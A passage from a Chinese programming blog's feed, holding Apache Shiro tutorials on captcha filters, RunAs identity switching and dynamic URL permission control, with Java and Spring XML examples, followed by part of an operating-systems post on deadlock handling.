isAccessAllowed(ServletRequest request, ServletResponse response, Object mappedValue) throws Exception &#123; //1、设置验证码是否开启属性，页面可以根据该属性来决定是否显示验证码 request.setAttribute(&quot;jcaptchaEbabled&quot;, jcaptchaEbabled); HttpServletRequest httpServletRequest = WebUtils.toHttp(request); //2、判断验证码是否禁用 或不是表单提交（允许访问） if (jcaptchaEbabled == false || !&quot;post&quot;.equalsIgnoreCase(httpServletRequest.getMethod())) &#123; return true; &#125; //3、此时是表单提交，验证验证码是否正确 return JCaptcha.validateResponse(httpServletRequest, httpServletRequest.getParameter(jcaptchaParam)); &#125; protected boolean onAccessDenied(ServletRequest request, ServletResponse response) throws Exception &#123; //如果验证码失败了，存储失败key属性 request.setAttribute(failureKeyAttribute, &quot;jCaptcha.error&quot;); return true; &#125;&#125; 七、MyFormAuthenticationFilter 用于验证码验证的 Shiro 拦截器在用于身份认证的拦截器之前运行；但是如果验证码验证拦截器失败了，就不需要进行身份认证拦截器流程了；所以需要修改下如 FormAuthenticationFilter 身份认证拦截器，当验证码验证失败时不再走身份认证拦截器。 12345678public class MyFormAuthenticationFilter extends FormAuthenticationFilter &#123; protected boolean onAccessDenied(ServletRequest request, ServletResponse response, Object mappedValue) throws Exception &#123; if(request.getAttribute(getFailureKeyAttribute()) != null) &#123; return true; &#125; return super.onAccessDenied(request, response, mappedValue); &#125;&#125;&amp;nbsp; 即如果之前已经错了，那直接跳过即可。 八、spring-config-shiro.xml 123456789101112131415161718192021222324252627282930313233&lt;bean id=&quot;authcFilter&quot; class=&quot;com.github.zhangkaitao.shiro.chapter22.jcaptcha.MyFormAuthenticationFilter&quot;&gt; &lt;property name=&quot;usernameParam&quot; value=&quot;username&quot;/&gt; &lt;property name=&quot;passwordParam&quot; value=&quot;password&quot;/&gt; &lt;property name=&quot;rememberMeParam&quot; value=&quot;rememberMe&quot;/&gt; &lt;property name=&quot;failureKeyAttribute&quot; value=&quot;shiroLoginFailure&quot;/&gt;&lt;/bean&gt;&lt;bean id=&quot;jCaptchaValidateFilter&quot; class=&quot;com.github.zhangkaitao.shiro.chapter22.jcaptcha.JCaptchaValidateFilter&quot;&gt; &lt;property name=&quot;jcaptchaEbabled&quot; value=&quot;true&quot;/&gt; &lt;property name=&quot;jcaptchaParam&quot; value=&quot;jcaptchaCode&quot;/&gt; &lt;property name=&quot;failureKeyAttribute&quot; value=&quot;shiroLoginFailure&quot;/&gt;&lt;/bean&gt;&lt;bean id=&quot;shiroFilter&quot; class=&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt; &lt;property name=&quot;securityManager&quot; ref=&quot;securityManager&quot;/&gt; &lt;property name=&quot;loginUrl&quot; value=&quot;/login&quot;/&gt; &lt;property name=&quot;filters&quot;&gt; &lt;util:map&gt; &lt;entry key=&quot;authc&quot; value-ref=&quot;authcFilter&quot;/&gt; &lt;entry key=&quot;sysUser&quot; value-ref=&quot;sysUserFilter&quot;/&gt; &lt;entry key=&quot;jCaptchaValidate&quot; value-ref=&quot;jCaptchaValidateFilter&quot;/&gt; &lt;/util:map&gt; &lt;/property&gt; &lt;property name=&quot;filterChainDefinitions&quot;&gt; &lt;value&gt; /static/** = anon /jcaptcha* = anon /login = jCaptchaValidate,authc /logout = logout /authenticated = authc /** = user,sysUser &lt;/value&gt; &lt;/property&gt;&lt;/bean&gt; 九、login.jsp 登录页面 12345678&lt;c:if test=&quot;$&#123;jcaptchaEbabled&#125;&quot;&gt; 验证码： &lt;input type=&quot;text&quot; name=&quot;jcaptchaCode&quot;&gt;&lt;img class=&quot;jcaptcha-btn jcaptcha-img&quot; src=&quot;$&#123;pageContext.request.contextPath&#125;/jcaptcha.jpg&quot; title=&quot;点击更换验证码&quot;&gt; &lt;a class=&quot;jcaptcha-btn&quot; href=&quot;javascript:;&quot;&gt;换一张&lt;/a&gt; &lt;br/&gt;&lt;/c:if&gt;&amp;nbsp; 根据 jcaptchaEbabled 来显示验证码图片。 十、测试 输入 http://localhost:8080/chapter22 将重定向到登录页面；输入正确的用户名 / 密码 / 验证码即可成功登录，如果输入错误的验证码，将显示验证码错误页面：]]></content>
      <categories>
        <category>shiro</category>
      </categories>
      <tags>
        <tag>验证码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[授予身份及切换身份]]></title>
    <url>%2F2018%2F11%2F15%2F%E6%8E%88%E4%BA%88%E8%BA%AB%E4%BB%BD%E5%8F%8A%E5%88%87%E6%8D%A2%E8%BA%AB%E4%BB%BD%2F</url>
    <content type="text"><![CDATA[授予身份及切换身份在一些场景中，比如某个领导因为一些原因不能进行登录网站进行一些操作，他想把他网站上的工作委托给他的秘书，但是他不想把帐号 / 密码告诉他秘书，只是想把工作委托给他；此时和我们可以使用 Shiro 的 RunAs 功能，即允许一个用户假装为另一个用户（如果他们允许）的身份进行访问。 本章代码基于《第十六章 综合实例》，请先了解相关数据模型及基本流程后再学习本章。 表及数据 SQL 请运行 shiro-example-chapter21/sql/ shiro-schema.sql 表结构请运行 shiro-example-chapter21/sql/ shiro-schema.sql 数据 实体 具体请参考 com.github.zhangkaitao.shiro.chapter21 包下的实体。 1234public class UserRunAs implements Serializable &#123; private Long fromUserId;//授予身份帐号 private Long toUserId;//被授予身份帐号&#125;&amp;nbsp; 该实体定义了授予身份帐号（A）与被授予身份帐号（B）的关系，意思是 B 帐号将可以假装为 A 帐号的身份进行访问。 DAO 具体请参考 com.github.zhangkaitao.shiro.chapter21.dao 包下的 DAO 接口及实现。 Service 具体请参考 com.github.zhangkaitao.shiro.chapter21.service 包下的 Service 接口及实现。 1234567public interface UserRunAsService &#123; public void grantRunAs(Long fromUserId, Long toUserId); public void revokeRunAs(Long fromUserId, Long toUserId); public boolean exists(Long fromUserId, Long toUserId); public List&lt;Long&gt; findFromUserIds(Long toUserId); public List&lt;Long&gt; findToUserIds(Long fromUserId);&#125;&amp;nbsp; 提供授予身份、回收身份、关系存在判断及查找 API。 Web 控制器 RunAsController 该控制器完成：授予身份 / 回收身份 / 切换身份功能。 展示当前用户能切换到身份列表，及授予给其他人的身份列表： 1234567891011121314151617@RequestMappingpublic String runasList(@CurrentUser User loginUser, Model model) &#123; model.addAttribute(&quot;fromUserIds&quot;, userRunAsService.findFromUserIds(loginUser.getId())); model.addAttribute(&quot;toUserIds&quot;, userRunAsService.findToUserIds(loginUser.getId())); List&lt;User&gt; allUsers = userService.findAll(); allUsers.remove(loginUser); model.addAttribute(&quot;allUsers&quot;, allUsers); Subject subject = SecurityUtils.getSubject(); model.addAttribute(&quot;isRunas&quot;, subject.isRunAs()); if(subject.isRunAs()) &#123; String previousUsername = (String)subject.getPreviousPrincipals().getPrimaryPrincipal(); model.addAttribute(&quot;previousUsername&quot;, previousUsername); &#125; return &quot;runas&quot;;&#125;&amp;nbsp; Subject.isRunAs()：表示当前用户是否是 RunAs 用户，即已经切换身份了； Subject.getPreviousPrincipals()：得到切换身份之前的身份，一个用户可以切换很多次身份，之前的身份使用栈数据结构来存储； 授予身份 把当前用户身份授予给另一个用户，这样另一个用户可以切换身份到该用户。 12345678910111213@RequestMapping(&quot;/grant/&#123;toUserId&#125;&quot;)public String grant( @CurrentUser User loginUser, @PathVariable(&quot;toUserId&quot;) Long toUserId, RedirectAttributes redirectAttributes) &#123; if(loginUser.getId().equals(toUserId)) &#123; redirectAttributes.addFlashAttribute(&quot;msg&quot;, &quot;自己不能切换到自己的身份&quot;); return &quot;redirect:/runas&quot;; &#125; userRunAsService.grantRunAs(loginUser.getId(), toUserId); redirectAttributes.addFlashAttribute(&quot;msg&quot;, &quot;操作成功&quot;); return &quot;redirect:/runas&quot;;&#125;&amp;nbsp; 自己不能授予身份给自己； 调用 UserRunAsService. grantRunAs 把当前登录用户的身份授予给相应的用户； 回收身份 把授予给某个用户的身份回收回来。 123456789@RequestMapping(&quot;/revoke/&#123;toUserId&#125;&quot;)public String revoke( @CurrentUser User loginUser, @PathVariable(&quot;toUserId&quot;) Long toUserId, RedirectAttributes redirectAttributes) &#123; userRunAsService.revokeRunAs(loginUser.getId(), toUserId); redirectAttributes.addFlashAttribute(&quot;msg&quot;, &quot;操作成功&quot;); return &quot;redirect:/runas&quot;;&#125; 切换身份 123456789101112131415161718192021@RequestMapping(&quot;/switchTo/&#123;switchToUserId&#125;&quot;)public String switchTo( @CurrentUser User loginUser, @PathVariable(&quot;switchToUserId&quot;) Long switchToUserId, RedirectAttributes redirectAttributes) &#123; Subject subject = SecurityUtils.getSubject(); User switchToUser = userService.findOne(switchToUserId); if(loginUser.equals(switchToUser)) &#123; redirectAttributes.addFlashAttribute(&quot;msg&quot;, &quot;自己不能切换到自己的身份&quot;); return &quot;redirect:/runas&quot;; &#125; if(switchToUser == null || !userRunAsService.exists(switchToUserId, loginUser.getId())) &#123; redirectAttributes.addFlashAttribute(&quot;msg&quot;, &quot;对方没有授予您身份，不能切换&quot;); return &quot;redirect:/runas&quot;; &#125; subject.runAs(new SimplePrincipalCollection(switchToUser.getUsername(), &quot;&quot;)); redirectAttributes.addFlashAttribute(&quot;msg&quot;, &quot;操作成功&quot;); redirectAttributes.addFlashAttribute(&quot;needRefresh&quot;, &quot;true&quot;); return &quot;redirect:/runas&quot;;&#125;&amp;nbsp; 首先根据 switchToUserId 查找到要切换到的身份； 然后通过 UserRunAsService. exists() 判断当前登录用户是否可以切换到该身份； 通过 Subject.runAs() 切换到该身份； 切换到上一个身份 12345678910@RequestMapping(&quot;/switchBack&quot;)public String switchBack(RedirectAttributes redirectAttributes) &#123; Subject subject = SecurityUtils.getSubject(); if(subject.isRunAs()) &#123; subject.releaseRunAs(); &#125; redirectAttributes.addFlashAttribute(&quot;msg&quot;, &quot;操作成功&quot;); redirectAttributes.addFlashAttribute(&quot;needRefresh&quot;, &quot;true&quot;); return &quot;redirect:/runas&quot;;&#125;&amp;nbsp; 通过 Subject.releaseRunAs() 切换会上一个身份； 此处注意的是我们可以切换多次身份，如 A 切换到 B，然后再切换到 C；那么需要调用两次 Subject. releaseRunAs() 才能切换会 A；即内部使用栈数据结构存储着切换过的用户；Subject. getPreviousPrincipals() 得到上一次切换到的身份，比如当前是 C；那么调用该 API 将得到 B 的身份。 其他代码和配置和《第十六章 综合实例》一样，请参考该章。 测试 1、首先访问 http://localhost:8080/chapter21/，输入 admin/123456 进行登录；会看到如下界面： 2、点击切换身份按钮，跳到如下界面： 在该界面可以授权身份给其他人（点击授权身份可以把自己的身份授权给其他人 / 点击回收身份可以把之前授予的身份撤回）、或切换到其他身份（即假装为其他身份运行）； 3、点击切换到该身份按钮，切换到相应的身份运行，如： 此时 zhang 用户切换到 admin 身份；如果点击切换回该身份，会把当前身份切换会 zhang。]]></content>
      <categories>
        <category>shiro</category>
      </categories>
      <tags>
        <tag>权限验证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[动态URL权限控制]]></title>
    <url>%2F2018%2F11%2F15%2F%E5%8A%A8%E6%80%81URL%E6%9D%83%E9%99%90%E6%8E%A7%E5%88%B6%2F</url>
    <content type="text"><![CDATA[动态 URL 权限控制用过 Spring Security 的朋友应该比较熟悉对 URL 进行全局的权限控制，即访问 URL 时进行权限匹配；如果没有权限直接跳到相应的错误页面。Shiro 也支持类似的机制，不过需要稍微改造下来满足实际需求。不过在 Shiro 中，更多的是通过 AOP 进行分散的权限控制，即方法级别的；而通过 URL 进行权限控制是一种集中的权限控制。本章将介绍如何在 Shiro 中完成动态 URL 权限控制。 本章代码基于《第十六章 综合实例》，请先了解相关数据模型及基本流程后再学习本章。 表及数据 SQL 请运行 shiro-example-chapter19/sql/ shiro-schema.sql 表结构请运行 shiro-example-chapter19/sql/ shiro-schema.sql 数据 实体 具体请参考 com.github.zhangkaitao.shiro.chapter19 包下的实体。 1234567public class UrlFilter implements Serializable &#123; private Long id; private String name; //url名称/描述 private String url; //地址 private String roles; //所需要的角色，可省略 private String permissions; //所需要的权限，可省略&#125;&amp;nbsp; 表示拦截的 URL 和角色 / 权限之间的关系，多个角色 / 权限之间通过逗号分隔，此处还可以扩展其他的关系，另外可以加如 available 属性表示是否开启该拦截。 DAO 具体请参考 com.github.zhangkaitao.shiro.chapter19.dao 包下的 DAO 接口及实现。 Service 具体请参考 com.github.zhangkaitao.shiro.chapter19.service 包下的 Service 接口及实现。 1234567public interface UrlFilterService &#123; public UrlFilter createUrlFilter(UrlFilter urlFilter); public UrlFilter updateUrlFilter(UrlFilter urlFilter); public void deleteUrlFilter(Long urlFilterId); public UrlFilter findOne(Long urlFilterId); public List&lt;UrlFilter&gt; findAll();&#125; 基本的 URL 拦截的增删改查实现。 12345678910111213141516@Servicepublic class UrlFilterServiceImpl implements UrlFilterService &#123; @Autowiredprivate ShiroFilerChainManager shiroFilerChainManager; @Override public UrlFilter createUrlFilter(UrlFilter urlFilter) &#123; urlFilterDao.createUrlFilter(urlFilter); initFilterChain(); return urlFilter; &#125; //其他方法请参考源码 @PostConstruct public void initFilterChain() &#123; shiroFilerChainManager.initFilterChains(findAll()); &#125;&#125;&amp;nbsp; UrlFilterServiceImpl 在进行新增、修改、删除时会调用 initFilterChain 来重新初始化 Shiro 的 URL 拦截器链，即同步数据库中的 URL 拦截器定义到 Shiro 中。此处也要注意如果直接修改数据库是不会起作用的，因为只要调用这几个 Service 方法时才同步。另外当容器启动时会自动回调 initFilterChain 来完成容器启动后的 URL 拦截器的注册。 ShiroFilerChainManager 1234567891011121314151617181920212223242526272829@Servicepublic class ShiroFilerChainManager &#123; @Autowired private DefaultFilterChainManager filterChainManager; private Map&lt;String, NamedFilterList&gt; defaultFilterChains; @PostConstruct public void init() &#123; defaultFilterChains = new HashMap&lt;String, NamedFilterList&gt;(filterChainManager.getFilterChains()); &#125; public void initFilterChains(List&lt;UrlFilter&gt; urlFilters) &#123; //1、首先删除以前老的filter chain并注册默认的 filterChainManager.getFilterChains().clear(); if(defaultFilterChains != null) &#123; filterChainManager.getFilterChains().putAll(defaultFilterChains); &#125; //2、循环URL Filter 注册filter chain for (UrlFilter urlFilter : urlFilters) &#123; String url = urlFilter.getUrl(); //注册roles filter if (!StringUtils.isEmpty(urlFilter.getRoles())) &#123; filterChainManager.addToChain(url, &quot;roles&quot;, urlFilter.getRoles()); &#125; //注册perms filter if (!StringUtils.isEmpty(urlFilter.getPermissions())) &#123; filterChainManager.addToChain(url, &quot;perms&quot;, urlFilter.getPermissions()); &#125; &#125; &#125;&#125;&amp;nbsp; 1、init：Spring 容器启动时会调用 init 方法把在 spring 配置文件中配置的默认拦截器保存下来，之后会自动与数据库中的配置进行合并。2、initFilterChains：UrlFilterServiceImpl 会在 Spring 容器启动或进行增删改 UrlFilter 时进行注册 URL 拦截器到 Shiro。 拦截器及拦截器链知识请参考《第八章 拦截器机制》，此处再介绍下 Shiro 拦截器的流程： 12345678910AbstractShiroFilter //如ShiroFilter/ SpringShiroFilter都继承该Filter doFilter //Filter的doFilter doFilterInternal //转调doFilterInternal executeChain(request, response, chain) //执行拦截器链 FilterChain chain = getExecutionChain(request, response, origChain) //使用原始拦截器链获取新的拦截器链 chain.doFilter(request, response) //执行新组装的拦截器链getExecutionChain(request, response, origChain) //获取拦截器链流程 FilterChainResolver resolver = getFilterChainResolver(); //获取相应的FilterChainResolver FilterChain resolved = resolver.getChain(request, response, origChain); //通过FilterChainResolver根据当前请求解析到新的FilterChain拦截器链 默认情况下如使用 ShiroFilterFactoryBean 创建 shiroFilter 时，默认使用 PathMatchingFilterChainResolver 进行解析，而它默认是根据当前请求的 URL 获取相应的拦截器链，使用 Ant 模式进行 URL 匹配；默认使用 DefaultFilterChainManager 进行拦截器链的管理。 PathMatchingFilterChainResolver 默认流程： 123456789101112131415161718public FilterChain getChain(ServletRequest request, ServletResponse response, FilterChain originalChain) &#123; //1、首先获取拦截器链管理器 FilterChainManager filterChainManager = getFilterChainManager(); if (!filterChainManager.hasChains()) &#123; return null; &#125; //2、接着获取当前请求的URL（不带上下文） String requestURI = getPathWithinApplication(request); //3、循环拦截器管理器中的拦截器定义（拦截器链的名字就是URL模式） for (String pathPattern : filterChainManager.getChainNames()) &#123; //4、如当前URL匹配拦截器名字（URL模式） if (pathMatches(pathPattern, requestURI)) &#123; //5、返回该URL模式定义的拦截器链 return filterChainManager.proxy(originalChain, pathPattern); &#125; &#125; return null;&#125;&amp;nbsp; 默认实现有点小问题： 如果多个拦截器链都匹配了当前请求 URL，那么只返回第一个找到的拦截器链；后续我们可以修改此处的代码，将多个匹配的拦截器链合并返回。 DefaultFilterChainManager 内部使用 Map 来管理 URL 模式 - 拦截器链的关系；也就是说相同的 URL 模式只能定义一个拦截器链，不能重复定义；而且如果多个拦截器链都匹配时是无序的（因为使用 map.keySet() 获取拦截器链的名字，即 URL 模式）。 FilterChainManager 接口： 123456789101112public interface FilterChainManager &#123; Map&lt;String, Filter&gt; getFilters(); //得到注册的拦截器 void addFilter(String name, Filter filter); //注册拦截器 void addFilter(String name, Filter filter, boolean init); //注册拦截器 void createChain(String chainName, String chainDefinition); //根据拦截器链定义创建拦截器链 void addToChain(String chainName, String filterName); //添加拦截器到指定的拦截器链 void addToChain(String chainName, String filterName, String chainSpecificFilterConfig) throws ConfigurationException; //添加拦截器（带有配置的）到指定的拦截器链 NamedFilterList getChain(String chainName); //获取拦截器链 boolean hasChains(); //是否有拦截器链 Set&lt;String&gt; getChainNames(); //得到所有拦截器链的名字 FilterChain proxy(FilterChain original, String chainName); //使用指定的拦截器链代理原始拦截器链&#125;&amp;nbsp; 此接口主要三个功能：注册拦截器，注册拦截器链，对原始拦截器链生成代理之后的拦截器链，比如 1234567891011121314151617&lt;bean id=&quot;shiroFilter&quot; class=&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt;…… &lt;property name=&quot;filters&quot;&gt; &lt;util:map&gt; &lt;entry key=&quot;authc&quot; value-ref=&quot;formAuthenticationFilter&quot;/&gt; &lt;entry key=&quot;sysUser&quot; value-ref=&quot;sysUserFilter&quot;/&gt; &lt;/util:map&gt; &lt;/property&gt; &lt;property name=&quot;filterChainDefinitions&quot;&gt; &lt;value&gt; /login = authc /logout = logout /authenticated = authc /** = user,sysUser &lt;/value&gt; &lt;/property&gt;&lt;/bean&gt;&amp;nbsp; filters 属性定义了拦截器；filterChainDefinitions 定义了拦截器链；如 /** 就是拦截器链的名字；而 user,sysUser 就是拦截器名字列表。 之前说过默认的 PathMatchingFilterChainResolver 和 DefaultFilterChainManager 不能满足我们的需求，我们稍微扩展了一下： CustomPathMatchingFilterChainResolver 1234567891011121314151617181920212223242526public class CustomPathMatchingFilterChainResolver extends PathMatchingFilterChainResolver &#123; private CustomDefaultFilterChainManager customDefaultFilterChainManager; public void setCustomDefaultFilterChainManager( CustomDefaultFilterChainManager customDefaultFilterChainManager) &#123; this.customDefaultFilterChainManager = customDefaultFilterChainManager; setFilterChainManager(customDefaultFilterChainManager); &#125; public FilterChain getChain(ServletRequest request, ServletResponse response, FilterChain originalChain) &#123; FilterChainManager filterChainManager = getFilterChainManager(); if (!filterChainManager.hasChains()) &#123; return null; &#125; String requestURI = getPathWithinApplication(request); List&lt;String&gt; chainNames = new ArrayList&lt;String&gt;(); for (String pathPattern : filterChainManager.getChainNames()) &#123; if (pathMatches(pathPattern, requestURI)) &#123; chainNames.add(pathPattern); &#125; &#125; if(chainNames.size() == 0) &#123; return null; &#125; return customDefaultFilterChainManager.proxy(originalChain, chainNames); &#125;&#125;&amp;nbsp; 和默认的 PathMatchingFilterChainResolver 区别是，此处得到所有匹配的拦截器链，然后通过调用 CustomDefaultFilterChainManager.proxy(originalChain, chainNames) 进行合并后代理。 CustomDefaultFilterChainManager 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596public class CustomDefaultFilterChainManager extends DefaultFilterChainManager &#123; private Map&lt;String, String&gt; filterChainDefinitionMap = null; private String loginUrl; private String successUrl; private String unauthorizedUrl; public CustomDefaultFilterChainManager() &#123; setFilters(new LinkedHashMap&lt;String, Filter&gt;()); setFilterChains(new LinkedHashMap&lt;String, NamedFilterList&gt;()); addDefaultFilters(true); &#125; public Map&lt;String, String&gt; getFilterChainDefinitionMap() &#123; return filterChainDefinitionMap; &#125; public void setFilterChainDefinitionMap(Map&lt;String, String&gt; filterChainDefinitionMap) &#123; this.filterChainDefinitionMap = filterChainDefinitionMap; &#125; public void setCustomFilters(Map&lt;String, Filter&gt; customFilters) &#123; for(Map.Entry&lt;String, Filter&gt; entry : customFilters.entrySet()) &#123; addFilter(entry.getKey(), entry.getValue(), false); &#125;&#125; public void setDefaultFilterChainDefinitions(String definitions) &#123; Ini ini = new Ini(); ini.load(definitions); Ini.Section section = ini.getSection(IniFilterChainResolverFactory.URLS); if (CollectionUtils.isEmpty(section)) &#123; section = ini.getSection(Ini.DEFAULT_SECTION_NAME); &#125; setFilterChainDefinitionMap(section); &#125; public String getLoginUrl() &#123; return loginUrl; &#125; public void setLoginUrl(String loginUrl) &#123; this.loginUrl = loginUrl; &#125; public String getSuccessUrl() &#123; return successUrl; &#125; public void setSuccessUrl(String successUrl) &#123; this.successUrl = successUrl; &#125; public String getUnauthorizedUrl() &#123; return unauthorizedUrl; &#125; public void setUnauthorizedUrl(String unauthorizedUrl) &#123; this.unauthorizedUrl = unauthorizedUrl; &#125; @PostConstruct public void init() &#123; Map&lt;String, Filter&gt; filters = getFilters(); if (!CollectionUtils.isEmpty(filters)) &#123; for (Map.Entry&lt;String, Filter&gt; entry : filters.entrySet()) &#123; String name = entry.getKey(); Filter filter = entry.getValue(); applyGlobalPropertiesIfNecessary(filter); if (filter instanceof Nameable) &#123; ((Nameable) filter).setName(name); &#125; addFilter(name, filter, false); &#125; &#125; Map&lt;String, String&gt; chains = getFilterChainDefinitionMap(); if (!CollectionUtils.isEmpty(chains)) &#123; for (Map.Entry&lt;String, String&gt; entry : chains.entrySet()) &#123; String url = entry.getKey(); String chainDefinition = entry.getValue(); createChain(url, chainDefinition); &#125; &#125; &#125; protected void initFilter(Filter filter) &#123; //ignore &#125; public FilterChain proxy(FilterChain original, List&lt;String&gt; chainNames) &#123; NamedFilterList configured = new SimpleNamedFilterList(chainNames.toString()); for(String chainName : chainNames) &#123; configured.addAll(getChain(chainName)); &#125; return configured.proxy(original); &#125; private void applyGlobalPropertiesIfNecessary(Filter filter) &#123; applyLoginUrlIfNecessary(filter); applySuccessUrlIfNecessary(filter); applyUnauthorizedUrlIfNecessary(filter); &#125; private void applyLoginUrlIfNecessary(Filter filter) &#123; //请参考源码 &#125; private void applySuccessUrlIfNecessary(Filter filter) &#123; //请参考源码 &#125; private void applyUnauthorizedUrlIfNecessary(Filter filter) &#123; //请参考源码 &#125;&#125;&amp;nbsp; CustomDefaultFilterChainManager：调用其构造器时，会自动注册默认的拦截器； loginUrl、successUrl、unauthorizedUrl：分别对应登录地址、登录成功后默认跳转地址、未授权跳转地址，用于给相应拦截器的； filterChainDefinitionMap：用于存储如 ShiroFilterFactoryBean 在配置文件中配置的拦截器链定义，即可以认为是默认的静态拦截器链；会自动与数据库中加载的合并； setDefaultFilterChainDefinitions：解析配置文件中传入的字符串拦截器链配置，解析为相应的拦截器链； setCustomFilters：注册我们自定义的拦截器；如 ShiroFilterFactoryBean 的 filters 属性； init：初始化方法，Spring 容器启动时会调用，首先其会自动给相应的拦截器设置如 loginUrl、successUrl、unauthorizedUrl；其次根据 filterChainDefinitionMap 构建默认的拦截器链； initFilter：此处我们忽略实现 initFilter，因为交给 spring 管理了，所以 Filter 的相关配置会在 Spring 配置中完成； proxy：组合多个拦截器链为一个生成一个新的 FilterChain 代理。 Web 层控制器 请参考 com.github.zhangkaitao.shiro.chapter19.web.controller 包，相对于第十六章添加了 UrlFilterController 用于 UrlFilter 的维护。另外，移除了控制器方法上的权限注解，而是使用动态 URL 拦截进行控制。 Spring 配置——spring-config-shiro.xml 1234567891011121314151617181920&lt;bean id=&quot;filterChainManager&quot; class=&quot;com.github.zhangkaitao.shiro.spring.CustomDefaultFilterChainManager&quot;&gt; &lt;property name=&quot;loginUrl&quot; value=&quot;/login&quot;/&gt; &lt;property name=&quot;successUrl&quot; value=&quot;/&quot;/&gt; &lt;property name=&quot;unauthorizedUrl&quot; value=&quot;/unauthorized.jsp&quot;/&gt; &lt;property name=&quot;customFilters&quot;&gt; &lt;util:map&gt; &lt;entry key=&quot;authc&quot; value-ref=&quot;formAuthenticationFilter&quot;/&gt; &lt;entry key=&quot;sysUser&quot; value-ref=&quot;sysUserFilter&quot;/&gt; &lt;/util:map&gt; &lt;/property&gt; &lt;property name=&quot;defaultFilterChainDefinitions&quot;&gt; &lt;value&gt; /login = authc /logout = logout /unauthorized.jsp = authc /** = user,sysUser &lt;/value&gt; &lt;/property&gt;&lt;/bean&gt;&amp;nbsp; filterChainManager 是我们自定义的 CustomDefaultFilterChainManager，注册相应的拦截器及默认的拦截器链。 1234&lt;bean id=&quot;filterChainResolver&quot; class=&quot;com.github.zhangkaitao.shiro.spring.CustomPathMatchingFilterChainResolver&quot;&gt; &lt;property name=&quot;customDefaultFilterChainManager&quot; ref=&quot;filterChainManager&quot;/&gt;&lt;/bean&gt;&amp;nbsp; filterChainResolver 是自定义的 CustomPathMatchingFilterChainResolver，使用上边的 filterChainManager 进行拦截器链的管理。 123&lt;bean id=&quot;shiroFilter&quot; class=&quot;org.apache.shiro.spring.web.ShiroFilterFactoryBean&quot;&gt; &lt;property name=&quot;securityManager&quot; ref=&quot;securityManager&quot;/&gt;&lt;/bean&gt;&amp;nbsp; shiroFilter 不再定义 filters 及 filterChainDefinitions，而是交给了 filterChainManager 进行完成。 12345&lt;bean class=&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;&gt; &lt;property name=&quot;targetObject&quot; ref=&quot;shiroFilter&quot;/&gt; &lt;property name=&quot;targetMethod&quot; value=&quot;setFilterChainResolver&quot;/&gt; &lt;property name=&quot;arguments&quot; ref=&quot;filterChainResolver&quot;/&gt;&lt;/bean&gt;&amp;nbsp; 最后把 filterChainResolver 注册给 shiroFilter，其使用它进行动态 URL 权限控制。 其他配置和第十六章一样，请参考第十六章。 测试 1、首先执行 shiro-data.sql 初始化数据。2、然后再 URL 管理中新增如下数据： 3、访问 http://localhost:8080/chapter19/user 时要求用户拥有 aa 角色，此时是没有的所以会跳转到未授权页面；4、添加 aa 角色然后授权给用户，此时就有权限访问 http://localhost:8080/chapter19/user。 实际项目可以在此基础上进行扩展。]]></content>
      <categories>
        <category>shiro</category>
      </categories>
      <tags>
        <tag>权限验证</tag>
        <tag>动态URL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[死锁]]></title>
    <url>%2F2018%2F11%2F13%2F%E6%AD%BB%E9%94%81%2F</url>
    <content type="text"><![CDATA[必要条件 互斥：每个资源要么已经分配给了一个进程，要么就是可用的。 占有和等待：已经得到了某个资源的进程可以再请求新的资源。 不可抢占：已经分配给一个进程的资源不能强制性地被抢占，它只能被占有它的进程显式地释放。 环路等待：有两个或者两个以上的进程组成一条环路，该环路中的每个进程都在等待下一个进程所占有的资源。 处理方法主要有以下四种方法： 鸵鸟策略 死锁检测与死锁恢复 死锁预防 死锁避免 鸵鸟策略把头埋在沙子里，假装根本没发生问题。 因为解决死锁问题的代价很高，因此鸵鸟策略这种不采取任务措施的方案会获得更高的性能。 当发生死锁时不会对用户造成多大影响，或发生死锁的概率很低，可以采用鸵鸟策略。 大多数操作系统，包括 Unix，Linux 和 Windows，处理死锁问题的办法仅仅是忽略它。 死锁检测与死锁恢复不试图阻止死锁，而是当检测到死锁发生时，采取措施进行恢复。 1. 每种类型一个资源的死锁检测 上图为资源分配图，其中方框表示资源，圆圈表示进程。资源指向进程表示该资源已经分配给该进程，进程指向资源表示进程请求获取该资源。 图 a 可以抽取出环，如图 b，它满足了环路等待条件，因此会发生死锁。 每种类型一个资源的死锁检测算法是通过检测有向图是否存在环来实现，从一个节点出发进行深度优先搜索，对访问过的节点进行标记，如果访问了已经标记的节点，就表示有向图存在环，也就是检测到死锁的发生。 2. 每种类型多个资源的死锁检测 上图中，有三个进程四个资源，每个数据代表的含义如下： E 向量：资源总量 A 向量：资源剩余量 C 矩阵：每个进程所拥有的资源数量，每一行都代表一个进程拥有资源的数量 R 矩阵：每个进程请求的资源数量 进程 P1 和 P2 所请求的资源都得不到满足，只有进程 P3 可以，让 P3 执行，之后释放 P3 拥有的资源，此时 A = (2 2 2 0)。P2 可以执行，执行后释放 P2 拥有的资源，A = (4 2 2 1) 。P1 也可以执行。所有进程都可以顺利执行，没有死锁。 算法总结如下： 每个进程最开始时都不被标记，执行过程有可能被标记。当算法结束时，任何没有被标记的进程都是死锁进程。 寻找一个没有标记的进程 Pi，它所请求的资源小于等于 A。 如果找到了这样一个进程，那么将 C 矩阵的第 i 行向量加到 A 中，标记该进程，并转回 1。 如果没有这样一个进程，算法终止。 3. 死锁恢复 利用抢占恢复 利用回滚恢复 通过杀死进程恢复 死锁预防在程序运行之前预防发生死锁。 1. 破坏互斥条件例如假脱机打印机技术允许若干个进程同时输出，唯一真正请求物理打印机的进程是打印机守护进程。 2. 破坏占有和等待条件一种实现方式是规定所有进程在开始执行前请求所需要的全部资源。 3. 破坏不可抢占条件4. 破坏环路等待给资源统一编号，进程只能按编号顺序来请求资源。 死锁避免在程序运行时避免发生死锁。 1. 安全状态 图 a 的第二列 Has 表示已拥有的资源数，第三列 Max 表示总共需要的资源数，Free 表示还有可以使用的资源数。从图 a 开始出发，先让 B 拥有所需的所有资源（图 b），运行结束后释放 B，此时 Free 变为 5（图 c）；接着以同样的方式运行 C 和 A，使得所有进程都能成功运行，因此可以称图 a 所示的状态时安全的。 